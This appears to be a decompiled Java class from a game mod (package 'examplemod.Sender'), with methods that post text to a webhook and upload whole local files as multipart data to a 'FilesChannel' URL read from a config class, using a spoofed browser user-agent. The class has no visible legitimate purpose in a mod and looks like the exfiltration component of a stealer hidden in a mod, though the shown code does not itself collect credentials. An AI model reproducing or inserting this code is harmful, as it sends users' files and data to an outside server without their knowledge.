package com.example.examplemod.Sender;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;

public class SendMessage {
   public static void doThing(String message, String webhook) {
      PrintWriter out = null;
      BufferedReader in = null;
      StringBuilder result = new StringBuilder();

      try {
         URL realUrl = new URL(webhook);
         URLConnection conn = realUrl.openConnection();
         conn.setRequestProperty("accept", "*/*");
         conn.setRequestProperty("connection", "Keep-Alive");
         conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
         conn.setDoOutput(true);
         conn.setDoInput(true);
         out = new PrintWriter(conn.getOutputStream());
         String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
         out.print(postData);
         out.flush();
         in = new BufferedReader(new InputStreamReader(conn.getInputStream()));

         String line;
         while((line = in.readLine()) != null) {
            result.append("/n").append(line);
         }
      } catch (Exception var17) {
         var17.printStackTrace();
      } finally {
         try {
            if (out != null) {
               out.close();
            }

            if (in != null) {
               in.close();
            }
         } catch (IOException var16) {
            var16.printStackTrace();
         }

      }

      System.out.println(result.toString());
   }

   public static void sendFile(File file) throws Exception {
      String boundary = Long.toHexString(System.currentTimeMillis());
      HttpURLConnection connection = (HttpURLConnection)(new URL(Cfg.FilesChannel)).openConnection();
      connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
      connection.setRequestProperty("User-Agent", "Mozilla/5.0");
      connection.setDoOutput(true);
      OutputStream os = connection.getOutputStream();
      Throwable var4 = null;

      try {
         os.write(("--" + boundary + "\n").getBytes());
         os.write(("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"\n\n").getBytes());
         FileInputStream inputStream = new FileInputStream(file);
         Throwable var6 = null;

         try {
            int fileSize = (int)file.length();
            byte[] fileBytes = new byte[fileSize];
            inputStream.read(fileBytes, 0, fileSize);
            os.write(fileBytes);
         } catch (Throwable var30) {
            var6 = var30;
            throw var30;
         } finally {
            if (inputStream != null) {
               if (var6 != null) {
                  try {
                     inputStream.close();
                  } catch (Throwable var29) {
                     var6.addSuppressed(var29);
                  }
               } else {
                  inputStream.close();
               }
            }

         }

         os.write(("\n--" + boundary + "--\n").getBytes());
      } catch (Throwable var32) {
         var4 = var32;
         throw var32;
      } finally {
         if (os != null) {
            if (var4 != null) {
               try {
                  os.close();
               } catch (Throwable var28) {
                  var4.addSuppressed(var28);
               }
            } else {
               os.close();
            }
         }

      }

      connection.getResponseCode();
      Thread.sleep(500L);
   }
}
